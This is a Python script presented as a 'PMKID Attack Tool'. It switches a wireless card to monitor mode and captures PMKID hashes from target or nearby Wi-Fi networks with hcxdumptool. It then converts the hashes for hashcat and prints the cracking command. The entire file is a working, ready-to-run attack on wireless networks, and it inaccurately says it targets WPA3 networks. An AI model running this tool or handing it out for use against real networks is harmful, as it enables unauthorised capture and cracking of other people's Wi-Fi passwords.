#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import sys
import time
import argparse
import subprocess
import datetime
import signal

# Ensure we're in the correct directory
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
LOGS_DIR = os.path.join(os.path.dirname(SCRIPT_DIR), "logs")

# Create logs directory if it doesn't exist
if not os.path.exists(LOGS_DIR):
    os.makedirs(LOGS_DIR)

def signal_handler(sig, frame):
    print('\n[!] Attack interrupted by user. Cleaning up...')
    # Reset wifi adapter
    subprocess.run(['ip', 'link', 'set', args.interface, 'down'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['iw', 'dev', args.interface, 'set', 'type', 'managed'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['ip', 'link', 'set', args.interface, 'up'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print("[+] Interface reset to managed mode.")
    sys.exit(0)

def check_root():
    """Check if script is run as root"""
    if os.geteuid() != 0:
        print("[!] This script must be run as root.")
        sys.exit(1)

def check_tools():
    """Check if required tools are installed"""
    tools = ["hcxdumptool", "hcxpcapngtool"]
    for tool in tools:
        if subprocess.run(['which', tool], stdout=subprocess.DEVNULL).returncode != 0:
            print(f"[!] Required tool '{tool}' is not installed.")
            print("[!] Please install hcxtools package.")
            sys.exit(1)

def setup_interface(interface):
    """Set up wireless interface for monitoring"""
    print(f"[*] Setting up {interface} for monitoring...")
    
    # Bring interface down
    subprocess.run(['ip', 'link', 'set', interface, 'down'], stdout=subprocess.DEVNULL)
    
    # Set monitor mode
    subprocess.run(['iw', 'dev', interface, 'set', 'type', 'monitor'], stdout=subprocess.DEVNULL)
    
    # Bring interface up
    subprocess.run(['ip', 'link', 'set', interface, 'up'], stdout=subprocess.DEVNULL)
    
    print(f"[+] Interface {interface} ready in monitor mode")
    return interface

def capture_pmkid(interface, target_bssid=None, target_channel=None, target_essid=None):
    """Capture PMKID using hcxdumptool"""
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    output_file = os.path.join(LOGS_DIR, f"pmkid_capture_{timestamp}.pcapng")
    
    # Build command based on target information
    cmd = ['hcxdumptool', '-i', interface, '-o', output_file, '--enable_status=1']
    
    if target_bssid:
        cmd.extend(['--filterlist_ap', target_bssid])
        target_info = f"{target_essid or 'Unknown'} ({target_bssid})"
        if target_channel:
            cmd.extend(['--filtermode=2', '--channel', target_channel])
    else:
        target_info = "all networks"
    
    print(f"[*] Starting PMKID capture for {target_info}...")
    print("[*] This will attempt to capture PMKID hashes from WPA3-enabled networks")
    print("[*] Press Ctrl+C to stop the capture")
    
    try:
        # Start hcxdumptool
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        
        # Show status updates
        while True:
            line = process.stdout.readline()
            if not line and process.poll() is not None:
                break
            
            if line:
                line = line.strip()
                # Only print informative messages
                if any(x in line.lower() for x in ["pmkid", "found", "ap-less", "error", "warning"]):
                    print(f"[*] {line}")
            
            time.sleep(0.1)
            
    except KeyboardInterrupt:
        print("\n[*] Stopping PMKID capture...")
        process.terminate()
        process.wait()
    
    if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
        print(f"[+] PCAPNG file saved to: {output_file}")
        print("[*] Converting PCAPNG to hashcat format...")
        
        # Convert to hashcat format
        hash_file = os.path.join(LOGS_DIR, f"pmkid_hashes_{timestamp}.16800")
        subprocess.run([
            'hcxpcapngtool', 
            '-o', hash_file, 
            '--pmkid=1',
            output_file
        ])
        
        if os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
            print(f"[+] PMKID hashes extracted to: {hash_file}")
            
            # Count PMKIDs found
            with open(hash_file, 'r') as f:
                hash_count = sum(1 for _ in f)
            
            if hash_count > 0:
                print(f"[+] Found {hash_count} PMKID hash(es)!")
                print("[+] You can crack them using:")
                print(f"    hashcat -m 16800 {hash_file} wordlist.txt")
            else:
                print("[!] No PMKID hashes found.")
        else:
            print("[!] No PMKID hashes found in the capture.")
    else:
        print("[!] No data captured or file not found.")

def reset_interface(interface):
    """Reset interface to managed mode"""
    print("[*] Resetting interface to managed mode...")
    subprocess.run(['ip', 'link', 'set', interface, 'down'], stdout=subprocess.DEVNULL)
    subprocess.run(['iw', 'dev', interface, 'set', 'type', 'managed'], stdout=subprocess.DEVNULL)
    subprocess.run(['ip', 'link', 'set', interface, 'up'], stdout=subprocess.DEVNULL)
    print("[+] Interface reset complete.")

def main():
    check_root()
    check_tools()
    
    # Register signal handler
    signal.signal(signal.SIGINT, signal_handler)
    
    interface = setup_interface(args.interface)
    
    # Capture PMKIDs
    capture_pmkid(interface, args.bssid, args.channel, args.essid)
    
    # Reset interface
    reset_interface(interface)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="WiFU: PMKID Attack Tool")
    parser.add_argument('-i', '--interface', required=True, help='Wireless interface to use')
    parser.add_argument('-b', '--bssid', help='Target BSSID (optional)')
    parser.add_argument('-c', '--channel', help='Target channel (optional)')
    parser.add_argument('-e', '--essid', help='Target ESSID/name (optional)')
    
    args = parser.parse_args()
    
    main()
